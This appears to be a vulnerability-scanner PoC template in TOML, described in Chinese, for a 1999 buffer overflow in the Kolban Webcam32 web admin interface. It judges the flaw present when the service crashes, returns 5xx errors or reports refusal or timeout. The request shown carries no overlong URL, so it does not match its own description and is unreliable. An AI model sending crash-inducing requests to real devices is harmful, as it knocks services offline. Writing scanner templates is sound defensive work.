[info]
author = "ave"
description = "向Kolban Webcam32 Web管理界面发送超长URL触发缓冲区溢出，通过检测服务异常响应验证漏洞存在性"
id = "POC-AVE-1999-1458"
name = "Kolban Webcam32 Web管理缓冲区溢出PoC"
severity = "high"
tags = ["ave-1999-1458"]
vuln_id = [
    "CVE-1999-1292",
    "AVE-1999-1458",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "not respond",
    "refused",
    "timeout",
    "disconnected",
]
